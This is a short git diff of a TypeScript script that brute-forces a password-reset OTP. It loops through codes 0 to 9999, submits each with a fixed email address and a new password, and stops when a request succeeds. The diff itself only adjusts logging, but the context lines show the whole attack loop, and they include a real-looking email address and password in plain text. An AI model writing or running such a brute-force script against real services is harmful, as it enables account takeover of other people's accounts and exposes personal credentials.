@@ -21,7 +21,7 @@ async function main({ email, password, otp }: UserCredentials) {
         },
       }
     );
-
+    console.log(response.status)
     if (response.status === 200) {
       console.log(`Password has changed ${password} with OTP: ${otp}`);
         process.exit(0);
@@ -34,13 +34,13 @@ async function main({ email, password, otp }: UserCredentials) {
 
 async function sendRequestsInBatches(batchSize: number) {
   for (let i = 0; i < 10000; i++) {
-    console.log(`Sending request ${i + 1}`);
     await main({
       email: "kumashravan5@gmail.com",
       password: "kartdefbueif@123",
       otp: i.toString(),
     });
-
+    
+    
     // Optionally: Add delay between requests to avoid overwhelming the server
     if ((i + 1) % batchSize === 0) {
       // console.log(`Batch of ${batchSize} requests completed.`);
